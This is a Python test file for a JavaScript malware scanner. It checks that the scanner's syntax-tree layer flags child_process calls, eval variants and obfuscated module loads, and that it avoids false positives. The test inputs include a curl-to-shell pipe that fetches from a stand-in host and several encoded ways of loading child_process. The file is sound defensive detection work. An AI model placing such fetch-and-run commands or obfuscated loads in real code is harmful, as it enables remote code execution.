"""The syntax-tree layer: it must catch what the regexes structurally cannot,
stop flagging what they get wrong, and hand over to the regexes whenever the
file can't be parsed."""
from __future__ import annotations

from pathlib import Path

import pytest

from malwhunter.recon import ast_js
from malwhunter.recon.scanner import run_recon

pytestmark = pytest.mark.skipif(not ast_js.available(), reason="tree-sitter not installed")


def kinds(source: str) -> list[tuple[str, str]]:
    findings = ast_js.analyze(source)
    assert findings is not None, "file should parse"
    return [(f.kind, f.name) for f in findings]


# ---------- things the regexes could not see ----------

@pytest.mark.parametrize(
    "source, expected",
    [
        ("const cp = require('child_process');\ncp.exec(cmd);", [("command-exec", "exec")]),
        ("const { exec: run } = require('node:child_process');\nrun(userInput);", [("command-exec", "exec")]),
        ("import { execSync as go } from 'child_process';\ngo(cmd);", [("command-exec", "execSync")]),
        ("import * as cp from 'node:child_process';\ncp.spawn(cmd);", [("command-exec", "spawn")]),
        ("require('child_process').execSync(cmd)", [("command-exec", "execSync")]),
        ("const { promisify } = require('util');\nconst run = promisify(require('child_process').exec);\nrun(c)", [("command-exec", "exec")]),
        # the call spread over several lines — a line regex sees only `cp.exec(`
        ("const cp = require('child_process');\ncp.exec(\n  'ls ' +\n  dir\n);", [("command-exec", "exec")]),
        ("const cp = require('child_process'); cp['exec'](cmd)", [("command-exec", "exec")]),
        ("const cp = require('child_process'); cp.spawn('sh', ['-c', payload])", [("command-exec", "spawn")]),
    ],
)
def test_computed_commands_reaching_child_process_are_found(source, expected):
    assert kinds(source) == expected


@pytest.mark.parametrize(
    "source, module",
    [
        ("const m = require('child' + '_process');", "child_process"),
        ("const m = require(['child', 'process'].join('_'));", "child_process"),
        ("const a = 'child'; const b = '_process'; require(a + b);", "child_process"),
        ("require(`${'ht'}tps`)", "https"),
        ("require(String.fromCharCode(110, 101, 116))", "net"),
        ("require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString())", "child_process"),
        ("require(atob('Y2hpbGRfcHJvY2Vzcw=='))", "child_process"),
        ("require('\\x63hild_process')", None),  # escapes in a plain string are still a plain string
    ],
)
def test_sensitive_module_named_in_pieces_is_flagged(source, module):
    found = [(k, n) for k, n in kinds(source) if k == "obfuscated-module-load"]
    assert found == ([("obfuscated-module-load", module)] if module else [])


def test_shell_pipe_in_a_source_file_is_flagged():
    assert kinds("require('child_process').exec('curl http://x.test/p.sh | sh')") == [("shell-pipe", "exec")]


def test_indirect_and_global_eval_are_flagged():
    assert kinds("(0, eval)(code)") == [("eval", "eval")]
    assert kinds("globalThis.eval(code)") == [("eval", "eval")]
    assert kinds("new Function('a', body)") == [("eval", "Function")]
    assert kinds("const vm = require('vm'); vm.runInNewContext(src)") == [("eval", "vm.runInNewContext")]


def test_eval_of_a_folded_constant_is_not_flagged():
    assert kinds("eval('1 + ' + '2')") == []


# ---------- things the regexes got wrong ----------

def test_regexp_style_exec_helper_is_not_child_process():
    # core-js: `exec` is a local uncurried RegExp.prototype.exec, called all over
    source = "var exec = uncurryThis(RegExp.prototype.exec);\nfunction f(chr){ return exec(ALPHA, chr); }"
    assert kinds(source) == []


def test_local_function_named_exec_or_eval_is_not_flagged():
    assert kinds("function exec(a, b){ return a; }\nexec(x, y);") == []
    assert kinds("function eval(x){ return x; }\neval(y);") == []
    assert kinds("const re = /a/; re.exec(str); obj.eval(x);") == []


def test_spawn_with_literal_command_is_fine():
    assert kinds("const cp = require('child_process'); cp.spawn('node', ['server.js']); cp.execSync('git status');") == []


def test_dynamic_require_keeps_spawn_detection_but_not_exec():
    # we can't tell what `m` is, so don't lose spawn(cmd) — but `.exec` on an unknown object is mostly RegExp
    assert kinds("const m = require(name); m.spawn(cmd);") == [("command-exec", "spawn")]
    assert kinds("const m = require(name); m.exec(str);") == []


def test_ordinary_modules_loaded_by_name_are_not_flagged():
    assert kinds("const a = require('./lib/' + file); const b = require(path.join(__dirname, 'x'));") == []


# ---------- fallback ----------

@pytest.mark.parametrize(
    "source",
    ["interface A { x: number }\nconst a: A = { x: 1 };", "#!/bin/sh\necho hi\nexec \"$@\"\n", "const = ;;; {{{"],
)
def test_unparseable_files_return_none_so_the_regexes_take_over(source):
    assert ast_js.analyze(source) is None


def test_very_large_files_use_the_regexes(monkeypatch):
    monkeypatch.setattr(ast_js, "_MAX_AST_BYTES", 10)
    assert ast_js.analyze("const a = 1; const b = 2;") is None


def test_scanner_falls_back_to_regexes_when_the_parser_is_unavailable(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(ast_js, "_PARSER", None)
    (tmp_path / "x.js").write_text("const cp = require('child_process');\ncp.exec(cmd);\n")
    assert any(s.category == "command-exec-computed-arg" for s in run_recon(tmp_path, "p", {}))


def test_typescript_syntax_still_gets_the_regex_rules(tmp_path: Path):
    (tmp_path / "x.js").write_text("const run = (c: string): void => { require('child_process').exec(c); };\n")
    assert any(s.category == "command-exec-computed-arg" for s in run_recon(tmp_path, "p", {}))


# ---------- end to end through the scanner ----------

def test_scanner_reports_multiline_exec_with_the_right_line(tmp_path: Path):
    (tmp_path / "x.js").write_text("const cp = require('child_process');\n\ncp.exec(\n  base + arg\n);\n")
    sig = next(s for s in run_recon(tmp_path, "p", {}) if s.category == "command-exec-computed-arg")
    assert sig.evidence[0].line == 3 and "cp.exec(" in sig.evidence[0].excerpt


def test_scanner_flags_obfuscated_module_load(tmp_path: Path):
    (tmp_path / "x.js").write_text("const cp = require('child' + '_process');\n")
    assert [s.category for s in run_recon(tmp_path, "p", {})] == ["obfuscated-module-load"]


def test_scanner_no_longer_flags_regexp_exec_helpers(tmp_path: Path):
    (tmp_path / "x.js").write_text(
        "var exec = uncurryThis(RegExp.prototype.exec);\n"
        "module.exports = function (chr) { return exec(/[a-z]/, chr) || exec(DIGIT, chr); };\n"
    )
    assert run_recon(tmp_path, "p", {}) == []
